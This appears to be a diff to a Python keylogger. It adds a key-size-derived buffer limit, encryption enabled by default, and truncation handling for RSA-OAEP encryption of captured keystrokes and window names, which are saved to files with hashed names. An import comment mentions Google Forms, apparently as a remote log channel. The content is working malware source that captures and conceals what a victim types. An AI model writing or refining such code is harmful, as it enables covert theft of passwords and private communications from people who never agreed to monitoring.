@@ -15,27 +15,12 @@ import urllib              # for accessing Google Forms
 import datetime            # for getting the current time and using timedelta
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
+import Crypto.Util
 from Crypto.Hash import SHA3_512
 import base64
 import hashlib             # for hashing the names of files
 
-# CONSTANTS
-CHAR_LIMIT = 1000         # this many characters one should type to make the logger log the line_buffer.
-MINUTES_TO_LOG_TIME = 5   # this many minutes should pass to log the current time.
-
-# - GLOBAL SCOPE VARIABLES start -
-# general check
-if len(sys.argv) == 1:
-    sys.argv = [sys.argv[0], 'debug']
-mode = sys.argv[1]
-encryption_on = True if 'encrypt' in sys.argv else False
-reverse_encryption = False  # use True to decrypt back to be able to debug without turning the encryption off
-
-line_buffer, window_name = '', ''
-time_logged = datetime.datetime.now() - datetime.timedelta(minutes=MINUTES_TO_LOG_TIME)
-count, backspace_buffer_len = 0, 0
-
-# RSA KEYS FOR ENCRYPTION. Use the commands at the bottom of this script to generate a new key pair.
+# RSA PUBLIC KEY FOR ENCRYPTION
 public_key_str = """-----BEGIN PUBLIC KEY-----
 MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAshIomaK50npZ8k3nv9Rb
 y0LmfLALNxxaGZYBY2R1LQTPsQMyMOTjkx6frLdTHuZDI1HC6fE3ns8gQMP8sbjp
@@ -53,6 +38,26 @@ BTNBlFu/+2ZWAb6iA3YYJnECAwEAAQ==
 public_key = bytes(public_key_str, 'utf-8')
 # with open("public_key.pem", "rb") as f:
 #     public_key = f.read()
+
+# CONSTANTS
+# this number of characters must be typed for the logger to write the line_buffer:
+# (formula from Crypto.Cipher.PKCS1OAEP_Cipher.encypt)
+CHAR_LIMIT = Crypto.Util.number.ceil_div(Crypto.Util.number.size(RSA.importKey(public_key).n), 8) - \
+             2 * SHA3_512.digest_size - 2
+CHAR_LIMIT -= 20          # a safe margin
+MINUTES_TO_LOG_TIME = 5   # this number of minutes must pass for the current time to be logged.
+
+# - GLOBAL SCOPE VARIABLES start -
+# general check
+if len(sys.argv) == 1:
+    sys.argv = [sys.argv[0], 'local', 'encrypt']
+mode = sys.argv[1]
+encryption_on = True if 'encrypt' in sys.argv else False
+reverse_encryption = False  # use True to decrypt back to be able to debug without turning the encryption off
+
+line_buffer, window_name = '', ''
+time_logged = datetime.datetime.now() - datetime.timedelta(minutes=MINUTES_TO_LOG_TIME)
+count, backspace_buffer_len = 0, 0
 
 # Languages codes, taken from http://atpad.sourceforge.net/languages-ids.txt
 lcid_dict = {'0x436': 'Afrikaans - South Africa', '0x041c': 'Albanian - Albania', '0x045e': 'Amharic - Ethiopia',
@@ -235,14 +240,21 @@ def decrypt_many(encrypted, passphrase=None):
 
 
 def encrypt(message_str):
-    global public_key
+    global public_key, CHAR_LIMIT
     # Import the Public Key and use for encryption using PKCS1_OAEP (RSAES-OAEP).
     # See https://www.dlitz.net/software/pycrypto/api/2.6/Crypto.Cipher.PKCS1_OAEP-module.html
     key = RSA.importKey(public_key)
     cipher = PKCS1_OAEP.new(key, hashAlgo=SHA3_512)
     message = bytes(message_str, 'utf-8')
     # Use the public key for encryption
-    ciphertext = cipher.encrypt(message)
+    try:
+        ciphertext = cipher.encrypt(message)
+    except ValueError as e:
+        if e.args[0] == "Plaintext is too long.":
+            message = message[:CHAR_LIMIT - 5] + bytes("<...>", 'utf-8')
+            ciphertext = cipher.encrypt(message)
+        else:
+            raise e
     del key
     # Base 64 encode the encrypted message
     encrypted_message = base64.b64encode(ciphertext)
@@ -259,7 +271,7 @@ def log_local():
         with open(os.path.join(full_path, todays_date_hashed + ".txt"), "a") as fp:
             fp.write(line_buffer)
     except:
-        # maybe a problem with appending to the same file. rename the old one, and continue as normal
+        # if there's a problem with a file size: rename the old one, and continue as normal
         counter = 0
         while os.path.exists(os.path.join(full_path, todays_date_hashed + "_" + str(counter) + ".txt")):
             counter += 1
